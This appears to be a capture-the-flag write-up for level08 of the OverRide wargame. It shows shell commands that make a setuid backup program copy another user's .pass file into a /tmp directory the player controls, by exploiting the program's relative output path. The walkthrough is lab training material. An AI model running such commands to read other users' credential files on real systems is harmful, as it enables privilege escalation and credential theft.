# level08

We have a small backup program that takes one argument — the file to back up.
Obviously, we can’t just pass it the flag file and be done with it.

```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

But if we look into the logs, we find something interesting:

```bash
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: /home/users/level09/.pass
```

The file was read!
All we need to do is trick the program into writing its contents to a location we can access.

The problem is, the program tries to create a file in `./backups/home/users/level09`, but we don't have permission to create those directories under `./backups`.

However, since it's using a relative path, we can just hop into `/tmp` and do our mischief there.

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups//home/users/level09
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
<flag>
```
